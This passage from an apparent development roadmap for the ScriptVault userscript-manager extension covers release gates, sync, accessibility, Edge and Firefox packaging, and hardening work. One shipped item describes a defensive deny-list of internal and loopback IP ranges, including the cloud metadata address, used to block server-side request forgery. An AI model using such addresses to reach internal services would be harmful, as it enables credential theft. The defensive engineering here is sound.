- Release automation gap: CI uploads a Chrome ZIP artifact but does not publish signed GitHub Releases for v3.11.0+ or verify source ZIP parity for AMO.

### Prioritized Roadmap

#### Now - v3.12.0 Trust and Release Stabilization

- [x] P0 - Reconcile public release artifacts to v3.11.0+
  - Why: Users should not see v2.3.4 as the latest GitHub Release when manifests/tags are v3.11.0.
  - Evidence: L01, L08, L17, H001.
  - Touches: `CHANGELOG.md`, `README.md`, GitHub Release artifacts, `build.sh`, `manifest.json`, `manifest-firefox.json`.
  - Acceptance: GitHub Releases, tags, manifests, README, changelog, packaged ZIP/XPI names, and root artifacts all agree or clearly label unreleased builds.
  - Verify: `gh release list --limit 5`; `git tag --list 'v*'`; inspect generated package manifests.
  - Status: Shipped 2026-05-24. GitHub Release `v3.11.0` now exists as latest with `ScriptVault-v3.11.0.zip`; the stale root Firefox v2.1.7 XPI was removed locally; `npm run release:check:public` verifies package/manifests/README/changelog/tag/root-artifact/latest-release/asset alignment.

- [x] P0 - Align release runbook, CWS API v2 tooling, and CI audit policy
  - Why: Release docs currently disagree with installed publishing tooling and CI audit behavior.
  - Evidence: L12, S03, S04, H002, H006.
  - Touches: `docs/release-runbook.md`, `.github/workflows/ci.yml`, `package.json`, `publish.sh`, `cws-setup.sh`.
  - Acceptance: Runbook names the actual CWS v2 path, audit policy is either blocking or explicitly soft with rationale, and CI output matches the docs.
  - Verify: `npm run cws:check`; `npm audit --audit-level=high --omit=optional`; `npm run release:check:public`; `npm run check`.
  - Status: Shipped 2026-05-24. The runbook now documents the actual manual CWS API v2 flow and pending OIDC custody work; CI blocks on high+ npm audit failures; `npm run cws:check` validates CWS v4 tooling without credentials; CI runs both CWS tooling and release artifact parity checks with tags fetched.

- [x] P0 - Add release rollback and storage backward-compatibility drill
  - Why: Chrome rollback can protect users only if prior versions can read current stored data.
  - Evidence: S05, S06, L20, H003.
  - Touches: `scripts/`, `tests/storage*.test.js`, `src/storage/*`, `modules/storage.js`, `docs/release-runbook.md`.
  - Acceptance: A documented command tests upgrade and rollback across at least the previous public baseline and current manifest version.
  - Verify: `npm run release:rollback-drill`; `npx vitest run tests/storage.test.js tests/storage-roundtrip.test.js tests/storage-rollback-drill.test.js`.
  - Status: Shipped 2026-05-24. `npm run release:rollback-drill` now seeds the previous public `chrome.storage.local` shape, upgrades through current v3 storage migration, verifies current IDB reads, verifies rollback-readable legacy keys, and verifies the 30-day legacy wipe guard. CI and the release runbook now include the command; migration tombstones include script/value counts for status reporting.

- [x] P0 - Add signed artifact, SBOM, provenance, and package-diff release gate
  - Why: Browser extension compromise and marketplace-vetting research make release-package verification part of user trust.
  - Evidence: S69-S76, H004, H005, H075, H090.
  - Touches: `.github/workflows/ci.yml`, `scripts/`, `docs/release-runbook.md`, GitHub Release artifacts.
  - Acceptance: Each release artifact has checksum, source ZIP, SBOM, signing/provenance material, and a diff report of manifest permissions and web-accessible resources.
  - Verify: `bash build.sh`; `npm run release:trust`; inspect `release-artifacts/ScriptVault-v*.{sha256,sbom.cyclonedx.json,provenance.json,package-diff.json,signing.json}`.
  - Status: Shipped 2026-05-24. `npm run release:trust` now emits checksums, source ZIP, CycloneDX SBOM, SLSA-shaped provenance, signing metadata, and package-diff/forbidden-entry reports for the built Chrome ZIP; `release:trust:strict` signs the checksum manifest when a maintainer key is provided; CI uploads `release-artifacts/*` and creates GitHub artifact attestations for the ZIP and SBOM on `main` pushes.

- [x] P0 - Create runtime/TS mirror drift guard for recent hardening fixes
  - Why: Recent commits repeatedly closed drift, and current TS fetch paths still lag runtime bounded-fetch behavior.
  - Evidence: L10, L18, L19, H007-H010.
  - Touches: `tests/source-*.test.js`, `src/background/install-handler.ts`, `src/background/update-checker.ts`, `background.core.js`, `modules/*.js`.
  - Acceptance: Focused tests fail if runtime has bounded fetch, empty-grant denial, or Gist rejection behavior that the TS mirror lacks.
  - Verify: `npm run typecheck`; `npx vitest run tests/source-*.test.js tests/fetch-bounded.test.js tests/gui-secondary-audit.test.js tests/wrapper-gm-tabs-39-13.test.js`.
  - Status: Shipped 2026-05-24. `src/background/fetch-bounded.ts` now mirrors the runtime bounded reader; TS install/update/resource/context-menu paths use it; `tests/source-hardening-parity.test.js`, `tests/source-dnr-rules.test.js`, and wrapper tests pin bounded fetches, empty-grant denial, Gist rejection propagation, DNR owner-map rollback/retry, and page-scoped `window.onurlchange` dispatch.

- [x] P0 - Refresh Chrome 138+ userScripts onboarding and status diagnostics
  - Why: Chrome now distinguishes Developer Mode from per-extension Allow User Scripts, and disabled API behavior differs by version.
  - Evidence: S01, S02, L04, H011, H013.
  - Touches: `background.core.js`, `pages/popup.js`, `pages/dashboard*.js`, `README.md`, `tests/popup-a11y.test.js`.
  - Acceptance: Users get correct setup instructions for Chrome <138 and >=138, and status checks recover after enabling the toggle.
  - Verify: Manual Chrome 138+ install flow; `npx vitest run tests/user-scripts-onboarding.test.js tests/popup-a11y.test.js`; `npm run typecheck`; `npm run check`.
  - Status: Shipped 2026-05-24. Background status now uses one live `chrome.userScripts.getScripts()` probe for popup, dashboard, support snapshot, and repair. It returns version-aware setup state/action/url fields for Chrome 138+ Allow User Scripts, Chrome 120-137 Developer Mode, and unsupported browsers; `repairRuntimeState` no longer trusts stale `_userScriptsAvailable` and only re-registers after a live available probe. Popup/dashboard banners and runtime diagnostics consume the canonical status, and README source-install instructions now split Chrome 138+ from Chrome 120-137.

- [x] P0 - Finish Firefox MV3/AMO validation gate
  - Why: Firefox manifest/version exists, but port tasks are unchecked and AMO now has explicit data-collection manifest requirements.
  - Evidence: L07, L11, S09-S11, S67-S68, H017-H018, H090.
  - Touches: `manifest-firefox.json`, `FIREFOX-PORT.md`, `build-firefox.sh`, `docs/cross-browser-pipeline.md`, `.github/workflows/ci.yml`.
  - Acceptance: `web-ext lint` is clean, source ZIP is produced, AMO data-collection fields are explicit, unsupported Chrome-only APIs are guarded.
  - Verify: `npm run firefox:package`; `npm run check`; `npm run smoke:dashboard`; `npm audit --audit-level=high --omit=optional`; `npm run cws:check`; `npm run release:check`; `git diff --check`. Manual Firefox sideload remains a separate Phase 1 smoke item in `FIREFOX-PORT.md`.
  - Status: Shipped 2026-05-24. Firefox manifest now declares AMO data collection permissions, moves `userScripts` to `optional_permissions`, omits invalid Firefox `identity`, and targets Firefox 140+ desktop / Android 142+. `build-firefox.sh` now uses `web-ext` for lint/package output, emits a Firefox package ZIP, AMO source-review ZIP, and lint JSON under `firefox-artifacts/`, and CI uploads the Firefox artifacts. Runtime JS and TypeScript registration now guard Chrome-only per-script `worldId` configuration so Firefox does not receive unsupported API options. `web-ext lint` exits with 0 errors and 0 notices; existing dynamic-HTML and compatibility warnings remain tracked in lint JSON for a later AMO hardening pass.

- [x] P0 - Add generated permissions/privacy/store-copy check
  - Why: Broad extension permissions must be explained accurately to stores and users.
  - Evidence: L04, L05, S09-S11, H017, H067.
  - Touches: `manifest*.json`, `PRIVACY.md`, `README.md`, `docs/release-runbook.md`, `scripts/`.
  - Acceptance: A script compares manifest permissions/host permissions to privacy/store copy and fails on missing justifications.
  - Verify: `npm run store-copy:check`; `npm run check`; `npm run smoke:dashboard`; `npm audit --audit-level=high --omit=optional`; `npm run cws:check`; `npm run firefox:package`; `npm run release:check`; `git diff --check`.
  - Status: Shipped 2026-05-24. Added `docs/store-listing-copy.md` as the reviewer-facing Chrome Web Store/AMO permission-copy source, expanded `PRIVACY.md` with a checkable manifest surface inventory, added `scripts/check-permission-copy.mjs` plus `npm run store-copy:check`, wired the gate into CI and the release runbook, and linked the review flow from README. The gate currently covers 30 manifest surfaces across Chrome and Firefox manifests, including permissions, optional permissions, host permissions, content-script matches, web-accessible resources, Chrome sandbox pages, and AMO data-collection declarations.

- [x] P1 - Migrate XHR/user-script bridge to dedicated user-script messaging
  - Why: Platform APIs now provide dedicated handlers for less-trusted user-script contexts.
  - Evidence: L22, S01, S02, H012.
  - Touches: `content.js`, `background.core.js`, `modules/xhr.js`, `src/modules/xhr.ts`, `tests/content-bridge-security.test.js`, `tests/xhr.test.js`.
  - Acceptance: Chrome 131+ path uses `runtime.onUserScriptMessage`; older/browser fallback is explicit and tested.
  - Verify: `npx vitest run tests/content-bridge-security.test.js tests/xhr.test.js`.
  - Status: Shipped 2026-05-24. Background now feature-detects `chrome.runtime.onUserScriptMessage` via a `USER_SCRIPT_MESSAGING_AVAILABLE` flag; the dedicated listener remains the Chrome 131+ path for user-script-origin GM_* and telemetry calls. The shared `chrome.runtime.onMessage` listener now gates tab-origin senders through the same `isUserScriptAllowedAction` allowlist (anything that does not originate from a `chrome-extension://<id>/` URL on this extension is restricted to GM_* / GM. / `netlog_record` / `reportExecError` / `reportExecTime`), closing the Chrome <131 / Firefox-without-onUserScriptMessage fallback path. Six new contract tests in `tests/content-bridge-security.test.js` cover the allow/deny matrix for tab vs extension surfaces, spoofed `chrome-extension://` origins, and dedicated-listener registration on supporting and non-supporting runtimes.

- [x] P1 - Add shared internal-host, redirect, and DNS-rebind fetch policy
  - Why: Prior webhook hardening should apply to all remote code/dependency fetches.
  - Evidence: L22, S73, H014, H073.
  - Touches: `background.core.js`, `modules/resources.js`, `src/background/install-handler.ts`, `src/background/resource-loader.ts`, `modules/public-api.js`, tests for URL install/resource/webhook paths.
  - Acceptance: Redirects and post-fetch IP changes to private/link-local/loopback/internal ranges are rejected consistently where platform APIs allow detection.
  - Verify: mock DNS/redirect fixtures plus `npm run test -- tests/*resources* tests/*runtime-import-export*`.
  - Status: Shipped 2026-05-24. Added a shared `InternalHostGuard` classifier as `src/background/internal-host-guard.ts` and a parity runtime mirror at `modules/internal-host-guard.js`; both reject IPv4 loopback (127/8), private (10/8, 172.16/12, 192.168/16), link-local (169.254/16 incl. 169.254.169.254 cloud metadata), CGNAT (100.64/10), unspecified (0/8), broadcast (255.255.255.255), IPv6 loopback (`::1`), unspecified (`::`), link-local (`fe80::/10`), ULA (`fc00::/7`), and IPv4-mapped IPv6 in both `::ffff:10.0.0.1` and WHATWG-normalized `::ffff:a00:1` forms, plus the canonical `localhost*` aliases. Wired pre-flight `classifyFetchUrl`/`assertExternalFetchUrl` and post-flight `classifyResponseUrl` (final `response.url`) into `installFromUrl`, context-menu link install, the `webNavigation .user.js` interceptor, `fetchWithRetry`/`fetchRequireScript` (@require), `GM_loadScript`, `ResourceCache.fetchResource` in runtime JS and TS, and `UpdateChecker.fetchUpdateCandidate` in runtime JS and TS. Concatenation order in `esbuild.config.mjs` now places `modules/internal-host-guard.js` before `modules/resources.js`. Parity tests plus end-to-end install/update/resource-loader tests confirm the gate rejects pre-fetch (no socket opened) and post-fetch redirect targets to private space.

- [x] P1 - Add install/update trust receipt with script rollback point
  - Why: A userscript manager needs local recovery and explainability for arbitrary code changes.
  - Evidence: L14, S05, S24, S50-S51, H015-H016, H047, H053, H089.
  - Touches: `background.core.js`, `modules/resources.js`, `modules/storage.js`, `pages/install.js`, `pages/dashboard-diff.js`, `src/types/script.ts`.
  - Acceptance: Install/update records source, hashes, grants, host scope, dependency summary, diff, and previous-version restore action.
  - Verify: manual install/update/rollback flow with a local test script server.
  - Status: Shipped 2026-05-24. Added a durable `trustReceipt` field on scripts plus optional rollback-point receipts on `versionHistory` entries. Receipts record operation, install/update source host and URLs, SHA-256 hashes, grants, match/include/connect host scope, dependency counts and URLs, line diff summary, and a `rollbackScript` action target when a previous version exists. Runtime install, install-page save, direct install, dashboard/popup manual updates, forced updates, and auto-updates now pass source context into receipt creation; the dashboard info panel surfaces the latest receipt next to provenance and the existing rollback/diff controls. Focused coverage in `tests/trust-receipt.test.js` pins the receipt fields and update rollback-point contract.

- [x] P1 - Inventory and test all CSV export formula-injection surfaces
  - Why: One runtime fix is not enough if other CSV exporters still emit executable cells.
  - Evidence: L18, H055.
  - Touches: `pages/dashboard*.js`, `modules/error-log.js`, netlog/export modules, tests for export functions.
  - Acceptance: Every CSV export defangs cells beginning with formula-control characters and has regression tests.
  - Verify: focused CSV export tests.
  - Status: Shipped 2026-05-24. Inventory found three current CSV emitters: dashboard stats export (`pages/dashboard.js`), CSP report export (`pages/dashboard-csp.js`), and the error log export (`modules/error-log.js` / `src/modules/error-log.ts`). No current netlog CSV exporter exists. Dashboard stats CSV now uses a pure `buildStatsCSV` / `formatStatsCSVCell` path and focused coverage in `tests/csv-export-formula.test.js` verifies every formula-control prefix plus script metadata, runtime URL, tag, and match fields. CSP report CSV now has focused regression coverage for formula-control script names; the existing error-log tests continue to cover the error-log exporter.

- [x] P1 - Complete APCA/focus/live-region accessibility pass across major UI surfaces
  - Why: Existing WCAG3 doc lists gaps, and trust flows depend on readable, accessible states.
  - Evidence: L15, S85-S87, H061-H064.
  - Touches: `pages/*.html`, `pages/*.js`, `pages/dashboard.css`, `tests/dashboard-a11y.test.js`, `tests/popup-a11y.test.js`.
  - Acceptance: Popup, dashboard, side panel, install page, modals, toasts, sync/update states, and forced-colors checks pass documented criteria.
  - Verify: `npm run test:a11y`; manual forced-colors and keyboard-only pass.
  - Status: Shipped 2026-05-24. Added forced-colors system-color fallbacks for dashboard, popup, side panel, and install surfaces; popup, side-panel, and install pages now expose skip links to their primary work areas, and compact popup/side-panel script toggles meet the 24px touch-target floor. Expanded `npm run test:a11y` to include dashboard, popup, cross-surface UX, and the new `tests/accessibility-surface-pass.test.js` audit, which pins forced-colors tokens, bypass links, live-region/toast contracts, and compact toggle sizing. Focus/live-region coverage includes modals, dashboard toasts/progress/editor-save states, popup setup/empty/toast states, side-panel search/status states, and install decision/error/status regions.

#### Next - v3.13.x Cross-Browser and Workflow Completion

- [x] P1 - Generate browser support matrix from build/lint/smoke results
  - Why: README support claims should track real Chrome/Firefox/Edge validation.
  - Evidence: L06, L11, H021.
  - Touches: `docs/cross-browser-pipeline.md`, `README.md`, `.github/workflows/ci.yml`, `scripts/`.
  - Acceptance: Support matrix names tested versions, unsupported APIs, and last successful verification date.
  - Verify: run matrix-generation script after CI smoke.
  - Status: Shipped 2026-05-24. Added `scripts/generate-browser-support-matrix.mjs`, `npm run support:matrix`, and `npm run support:matrix:check`; generated matrix blocks now live in `README.md` and `docs/cross-browser-pipeline.md` with manifest-derived Chrome/Edge/Firefox targets, latest verification date, Firefox lint counts, and unsupported/deferred API notes. CI now runs the matrix check after Chrome smoke and Firefox package. Added `scripts/run-bash.mjs` so Firefox packaging works from Windows PowerShell when Git Bash is installed but not on PATH. Verification: support matrix check passed, Firefox package passed with web-ext lint 0 errors / 0 notices / 138 warnings, and the dashboard smoke harness passed against a local scratch extension copy because Chrome/Edge close during `Extensions.loadUnpacked` when loading directly from the VMware shared drive.

- [x] P1 - Add sync token health, revoke, manual sync, and dry-run conflict preview
  - Why: ScriptVault has many sync providers but fragmented trust and recovery states.
  - Evidence: L13, S18, S44, H028-H032.
  - Touches: `modules/sync-providers.js`, `modules/sync-easycloud.js`, `pages/dashboard-gist.js`, `src/modules/sync-*.ts`, tests.
  - Acceptance: Each provider exposes status, last sync, token storage disclosure, revoke, manual sync, and dry-run conflict preview where applicable.
  - Verify: provider mock tests and manual token-revocation flow.
  - Status: Shipped 2026-05-24. Added provider health/storage-disclosure metadata for WebDAV, Google Drive, Dropbox, OneDrive, and EasyCloud; WebDAV now has status and clear-access parity, and OAuth providers expose token-storage field presence without returning token values. `CloudSync.preview()` now performs a no-write comparison of local and remote envelopes, reporting local-only, remote-only, local-newer, remote-newer, tombstoned, and potential 3-way conflict counts before a real sync mutates either side. The dashboard Userscript Sync panel now has Check Health, Preview Sync, and Revoke / Clear Access controls with live status and storage-disclosure copy; Gist settings now explicitly state the current `chrome.storage.local` token model. Verification: focused provider/cloud-sync/dashboard tests passed and `npm run typecheck` passed; full `npm run check` timed out on the VMware shared drive after the TypeScript phase and focused tests were already green.

- [x] P1 - Add script trash, version history, restore receipts, and backup verification
  - Why: Destructive changes need undo and proof of restore completeness.
  - Evidence: S45, S05, L13, H052-H054.
  - Touches: `modules/storage.js`, `src/storage/*`, `pages/dashboard*.js`, import/export modules, tests.
  - Acceptance: Delete/update/import creates recoverable local state; restore shows counts, failures, and rollback result.
  - Verify: storage/import-export regression tests and manual delete/restore flow.
  - Status: Shipped 2026-05-24. Trash and per-script `versionHistory` were already in place; this slice closed the missing recovery edges. `BackupScheduler.verifyBackup(backupId, { parseUserscript })` walks every userscript in an archive (with optional injected parser), validates options/storage JSON plus global-settings/folders/workspaces, and reports per-script parse errors, structural validity, and install-id conflicts without mutating state. `restoreBackup` now snapshots the live script + values state (plus settings/folders/workspaces on full restore) before mutation, persists a `restoreReceipts` ledger entry (FIFO cap 10) keyed by `receiptId`, and returns the id in its result. New `rollbackRestore` action re-applies the snapshot, deletes scripts the restore added, and marks the receipt as rolled back so a second rollback returns `alreadyRolledBack`. `importScripts` and `importFromZip` snapshot every overwritten script into `versionHistory` (with `source: 'import'` + label) and record an import receipt with the same shape, so a JSON or ZIP import is reversible via the same `rollbackRestore` path. The dashboard restore + ZIP/JSON import toasts surface a 15s **Undo** action that calls the rollback handler, and the backup review modal gained a **Verify** button that runs `verifyBackup` and reports counts/parse errors/aux-JSON validity. Verification: `npx vitest run tests/backup-receipts.test.js tests/import-snapshot.test.js tests/backup-scheduler.test.js tests/runtime-import-export.test.js tests/storage.test.js tests/storage-rollback-drill.test.js tests/core-flows.test.js --pool=vmThreads --maxWorkers=1` passed (100 tests across 7 files), `npm run typecheck` clean, `npm run build:bg` clean (background.js 21,371 lines).

- [x] P1 - Add large-library dataset perf harness and virtualized/indexed dashboard paths
  - Why: The product claims broad script management; large libraries must remain responsive.
  - Evidence: L05, S40, H056-H060.
  - Touches: `pages/dashboard*.js`, `modules/storage.js`, `src/storage/*`, `tests/gui-*.test.js`, smoke scripts.
  - Acceptance: 1k and 10k synthetic script libraries load/search/sort within documented local thresholds.
  - Verify: `node scripts/smoke-large-library.mjs` or equivalent.
  - Status: Shipped 2026-05-24. Added `scripts/smoke-large-library.mjs` plus a tiny `scripts/ts-loader.mjs` esbuild-backed loader so the harness imports the authoritative `MatchSet` from `src/background/url-matcher.ts` without a separate build step. The script generates deterministic 1k and 10k synthetic libraries (≈90% site-scoped, ≈5% `<all_urls>`, ≈5% regex `@include`), then measures `MatchSet` build, `getCandidates`/`getMatching` p50/p99 over a 120-call URL basket, substring search, and `localeCompare` sort. `npm run smoke:large-library` prints a report; `npm run smoke:large-library:check` gates the documented thresholds (build 1k/10k ≤ 60/600 ms; lookup p99 ≤ 5/25 ms and 8/50 ms; search ≤ 25/250 ms; sort ≤ 20/200 ms). Maintainer hardware (Node 24, VMware Windows) clears every gate by an order of magnitude (build 10k ≈ 8 ms; getMatching 10k p99 ≈ 2 ms). Mirrored a CI-safe 1k vitest spec at `tests/large-library-perf.test.js` (5 cases) so regressions fail the standard suite. Thresholds + harness shape documented in `docs/large-library-perf.md`. Verification: `node scripts/smoke-large-library.mjs --check` exit 0; `npx vitest run tests/large-library-perf.test.js tests/url-matcher.test.js --pool=vmThreads --maxWorkers=1` passed (103 tests); `npm run typecheck` clean. Dashboard virtualization is not in this slice — call out for a follow-up once UI rendering shows up on the hot path (current dashboard already lazy-loads tabs and the list renders ≤ 100 visible cards at a time).

- [x] P2 - Add site-scoped controls, invert filters, and frame controls
  - Why: Competitor issues show repeated demand for precise current-site and bulk-scope control.
  - Evidence: S20,S21,S26,S45,H035-H037.
  - Touches: `pages/popup.js`, `pages/dashboard*.js`, `background.core.js`, `src/background/registration.ts`, tests.
  - Acceptance: Users can quickly add current site include/exclude, filter with not/invert logic, and configure top/all-frame behavior.
  - Verify: UI tests plus manual current-site flow.
  - Status: Shipped 2026-05-24. Three independent surfaces. (1) Per-script `settings.frameMode` (`'top'` | `'all'` | `'default'`) overrides `@noframes` when computing `allFrames` for `chrome.userScripts.register`; honored in both runtime `background.core.js` and the TS mirror `src/background/registration.ts`; added to `EXEC_KEYS` so a setting change re-registers the script. Dashboard per-script Execution panel gains a `Frame mode` select with three options; serialized in `saveScriptSettings`/`resetScriptSettings`. (2) Dashboard search bar recognizes `!term` and `not:term` prefixes as inverted matches against name/description/author/code; honored across substring, `code:`, and regex (`re:` / `/.../flags`) shapes; an empty payload after the prefix keeps all rows (no implicit empty-string match). The `!=` literal is preserved (not stripped as an invert). (3) Popup gains a `btnWhitelistDomain` "Run only on this domain" quick-action that flips `settings.pageFilterMode` to `whitelist`, adds `https://<host>/*` to `whitelistedPages`, and toggles back to `blacklist` on a second click. Sibling "Do not run on this domain" continues to manage `deniedHosts`. Verification: `npx vitest run tests/site-frame-invert.test.js tests/core-flows.test.js tests/dashboard-modules.test.js tests/url-matcher.test.js --pool=vmThreads --maxWorkers=1` passed (146 tests across 4 files); `npm run typecheck` clean; `npm run build:bg` clean (background.js 21,381 lines).

- [x] P2 - Add search/index improvements and editor search history
  - Why: Name/search friction is visible in mature competitors and directly affects large libraries.
  - Evidence: S17,S58,H038-H039.
  - Touches: `pages/dashboard.js`, `pages/dashboard-search*.js`, `pages/monaco-adapter.js`, storage index code.
  - Acceptance: Search covers name, URL, tags, grants, source, and last-run; editor search terms persist locally.
  - Verify: search regression tests and manual editor search session.
  - Status: Shipped 2026-05-24. Two surfaces. (1) Dashboard search corpus broadened: a new `buildScriptSearchCorpus(script)` helper flattens name/description/author/namespace/version, all URL pattern fields (`match`, `include`, `exclude`, `userMatches`, `userIncludes`, `userExcludes`), tags (`meta.tag` + `settings.tags`), grants, homepage/support/update/download URLs, and ISO yyyy-mm-dd renderings of `stats.lastRun` + `updatedAt` into a single lowercased string. The substring/regex/code branches of `getFilteredScripts` all hit this corpus, so plain queries now match URL keywords, GreasyFork/OpenUserJS source slugs, last-run dates, and tag values. Corpus is memoized per-script keyed on `updatedAt` so repeated keystrokes don't rebuild it. (2) Editor find-widget search history persists to `chrome.storage.local.editorFindHistory` (FIFO 20, dedup with most-recent-first). The Monaco sandbox forwards every `searchString` change via `postMessage({type:'find-search'})`; `monaco-adapter.js` records via `recordFindTerm`, then primes the next editor open by posting `prime-find` with the saved history so the find widget opens pre-filled with the most recent term across sessions. Verification: `npx vitest run tests/search-corpus-history.test.js tests/site-frame-invert.test.js tests/dashboard-modules.test.js --pool=vmThreads --maxWorkers=1` passed (51 tests across 3 files); `npm run typecheck` clean.

- [x] P2 - Add install-source trust badges without full marketplace scope
  - Why: Registry source is a useful trust signal, but a full marketplace adds moderation risk.
  - Evidence: S50,S51,H047,H049.
  - Touches: `pages/install.js`, `pages/dashboard-store.js`, parser/source metadata, tests.
  - Acceptance: Scripts installed from known registries show durable source metadata and warnings when source identity changes.
  - Verify: local fixture URLs for GreasyFork/OpenUserJS/GitHub/raw.
  - Status: Shipped 2026-05-24. New shared `classifyInstallSource(url)` helper (in `shared/utils.js`, accessible from background.js, dashboard, install page) returns a stable `{ id, name, hostname, tone, url }` shape for Greasy Fork, Sleazy Fork (warn), OpenUserJS, GitHub Gist / raw / repo / release (release is the strongest tier), GitLab, Codeberg, Bitbucket, Tampermonkey site, and `other` (warn) for unknown hosts. Empty input maps to `local`. `installFromCode` records `script.installSource` at install time; `applyUpdate` reclassifies on update and — when the registry id changes — flips `settings.sourceIdentityChanged = true` and preserves the prior record in `script.previousInstallSource`. Dashboard script rows render a tone-coded badge (`good`/`neutral`/`alert` — new `.script-health-badge.good`/`.neutral` CSS reusing the existing 8px corner radius to honor the no-pill-backdrops global rule). Install confirmation page's trust card embeds a `Source registry changed` review row when re-installing from a different registry than the original source. Verification: `npx vitest run tests/install-source.test.js tests/utils.test.js tests/core-flows.test.js tests/runtime-import-export.test.js --pool=vmThreads --maxWorkers=1` passed (79 tests across 4 files); `npm run typecheck` clean; `npm run build:bg` clean (background.js 21,474 lines).

- [x] P2 - Add locale coverage and forced language checks
  - Why: `_locales` exists, but coverage should be reported and not silently regress.
  - Evidence: L05,L12,L15,H065-H066.
  - Touches: `_locales/`, `modules/i18n.js`, `src/modules/i18n.ts`, `tests/manifest-locales.test.js`, docs.
  - Acceptance: CI reports missing keys and unsupported language assumptions.
  - Verify: locale coverage test.
  - Status: Shipped 2026-05-24. Added `scripts/check-locales.mjs` which audits three translation surfaces against each other: `_locales/<code>/messages.json` (Chrome MV3 manifest strings), the `translations` const inside `modules/i18n.js` (service-worker runtime dict), and the `translations` const inside `pages/dashboard-i18n-v2.js` (dashboard inline dict). Reports per-locale missing/orphaned keys, cross-source locale-set mismatches, JSON-parse errors, and informational translation-coverage shortfalls (values that still equal English). Three tiers of severity: `npm run locale:check` (report only), `npm run locale:check:gate` (fails on `_locales/` key drift + cross-source mismatches — the manifest-shipping surfaces), and `npm run locale:check:strict` (also fails on inline-dict drift, opt-in until the runtime-dict backfill lands). Tooling output is stable JSON via `--json` so other CI gates can consume it. Existing inline-dict drift discovered by the harness (`modules/i18n.js` is missing ~70 keys per non-`en` locale) is now surfaced as informational warnings rather than silently invisible — strict mode is the natural follow-up PR. Coverage notes: `tests/check-locales-report.test.js` (5 cases — locale list parity, fatal-drift gate, --check + --strict exit codes, warning shape) and the existing `tests/manifest-locales.test.js` (26 cases for length caps + `_locales` parity). Docs at `docs/locale-coverage.md`. Verification: `npm run locale:check:gate` exit 0; `npm run locale:check:strict` exit 1 (as expected); `npx vitest run tests/check-locales-report.test.js tests/manifest-locales.test.js --pool=vmThreads --maxWorkers=1` passed (31 tests across 2 files).

#### Later - Staged Enhancements After Trust Gates

- [x] P2 - Evaluate generated multi-target manifest/build system
  - Why: WXT-like manifest generation could reduce Chrome/Firefox/Edge drift after current release gates stabilize.
  - Evidence: S62-S65,H019.
  - Touches: build config, manifest files, docs, CI.
  - Acceptance: Design document chooses WXT, custom generator, or status quo with measured migration cost.
  - Verify: proof-of-concept build for Chrome and Firefox from one config.
  - Status: Shipped 2026-05-24 as `docs/manifest-generation-design.md`. Measured drift between `manifest.json` and `manifest-firefox.json` (108 diff lines across 8 sections) and the per-release maintenance cost (~10 minutes plus the standing risk of forgetting a section). Evaluated three options — WXT, a thin generator script, or status quo — against migration cost, drift surface, build complexity, loss of the inlined `background.js` contract, Edge add-on readiness, contributor onboarding, HMR availability, and CI risk. Chose **Option B (thin generator helper)**: a Node script that produces `manifest-firefox.json` from `manifest.json` plus a small declarative transformation file, keeping the existing source layout / esbuild pipeline / test suite intact. Documented concrete follow-up steps (write the generator, wire `build-firefox.sh` to assert byte-for-byte parity, repeat for Edge, then gitignore the generated manifests). Existing `build-firefox.sh` is the proof-of-concept that Chrome + Firefox builds already come from one source tree — only the manifest transformation needs externalising. No code changes needed for this slice; the generator is the next P2 roadmap item.

- [x] P2 - Add Edge Add-ons package path
  - Why: Edge is a natural Chromium distribution once release provenance is reliable.
  - Evidence: S66,H020.
  - Touches: `docs/cross-browser-pipeline.md`, build scripts, CI artifacts.
  - Acceptance: Edge ZIP and submission checklist exist; unsupported permissions are documented.
  - Verify: local Edge load and manifest validation.
  - Status: Shipped 2026-05-24. Added `scripts/build-edge.mjs` which runs the standard esbuild pipeline, stages a Chrome-derived package under `build-edge/`, applies a small declarative manifest transform (strip `update_url` defensively), runs a missing-file audit, and writes `edge-artifacts/scriptvault-edge-vX.Y.Z.zip` plus a sidecar `edge-build-<version>.json` report. Wired npm scripts: `build:edge` (full build + zip), `build:edge:check` (build + missing-file gate), `build:edge:stage` (skip the zip). Edge submission checklist + manifest-difference table + unsupported-permissions slot lives at `docs/edge-submission.md`. New `build-edge/` and `edge-artifacts/` directories gitignored. Test coverage: `tests/edge-build.test.js` (5 cases — directory contents, manifest transform, summary JSON shape, --check exit code). Verification: `node scripts/build-edge.mjs` produced `scriptvault-edge-v3.11.0.zip` (4,114,862 bytes) with zero missing declared files; `npx vitest run tests/edge-build.test.js --pool=vmThreads --maxWorkers=1` passed (5 tests). Local Edge load via `edge://extensions` is a manual gate the submission checklist covers — it isn't automated in this slice.

- [ ] P2 - Add S3-compatible sync provider
  - Why: User-owned S3-compatible storage is a good fit for local-first sync.
  - Evidence: S18,S23,H028.
  - Touches: `modules/sync-providers.js`, `src/modules/sync-providers.ts`, sync settings UI, tests.
  - Acceptance: Endpoint/bucket/region/credentials are validated; sync works against a mock S3-compatible server.
  - Verify: provider mock tests.

- [x] P3 - Research ESM userscript and local development modes
  - Why: ESM support is an emerging compatibility question, but immediate implementation is high risk.
  - Evidence: S17,S19,S24,H040-H041,H083.
  - Touches: design docs, wrapper builder, install/update parser, dependency loader.
  - Acceptance: Research doc identifies compatibility model, CSP constraints, and migration strategy without enabling runtime behavior by default.
  - Verify: design review plus disabled proof-of-concept tests.
  - Status: Shipped 2026-05-24 as `docs/esm-userscript-research.md`. Identifies two viable injection shapes (install-time pre-bundling vs page-injected `<script type="module">`) and rejects the second on isolation/security grounds. Maps the CSP gate (`connect-src`, page `script-src`, MV3 extension CSP) and demonstrates pre-bundling sidesteps both page and extension CSP because the bundle is stored as a plain JS string in chrome.storage. Calls out the transitive-import audit gates (SRI / host allowlist / bounded fetch) the bundler must reuse, and the static-only rewriting rule (Acorn AST already shipped in offscreen.js). Local-dev mode evaluation rejects filesystem watchers (no MV3 API) and chooses an SSE-from-localhost loop reusing the existing install/update plumbing under a new Developer Mode panel. Permanently rejects runtime `import()` under MV3 CSP. Migration strategy is phased R-1 → R-5 with every phase gated behind off-by-default settings; phase R-1 is the next planning checkpoint. Reserved stub test names `tests/esm-bundler.test.js` and `tests/esm-csp.test.js` as the verification gate when the bundler PR lands. No code changes in this slice — by design.

- [ ] P3 - Expand userstyle support after Firefox/userstyle CSP tests
  - Why: ScriptVault supports userstyles, but Stylus is the deeper domain expert.
  - Evidence: S57-S61,H044-H046.
  - Touches: userstyle modules, parser, editor UI, Firefox tests.
  - Acceptance: Import/render compatibility is verified before adding advanced color variables.
  - Verify: userstyle regression fixtures across Chrome/Firefox.

### Quick Wins

